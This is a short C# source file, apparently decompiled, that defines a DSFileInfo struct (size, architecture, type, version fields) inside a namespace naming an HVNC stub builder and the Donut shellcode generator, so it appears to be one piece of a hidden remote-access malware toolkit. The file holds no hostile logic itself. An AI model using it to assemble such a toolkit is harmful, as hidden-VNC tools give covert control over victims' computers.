using System.Runtime.InteropServices;

namespace BirdBrainmofo.HVNC.StubUtils.Donut.Structs
{
	// Token: 0x020000C3 RID: 195
	public struct DSFileInfo
	{
		// Token: 0x040006AC RID: 1708
		public int int_0;

		// Token: 0x040006AD RID: 1709
		public ulong size;

		// Token: 0x040006AE RID: 1710
		public byte map;

		// Token: 0x040006AF RID: 1711
		public int type;

		// Token: 0x040006B0 RID: 1712
		public int arch;

		// Token: 0x040006B1 RID: 1713
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
		public char[] ver;
	}
}
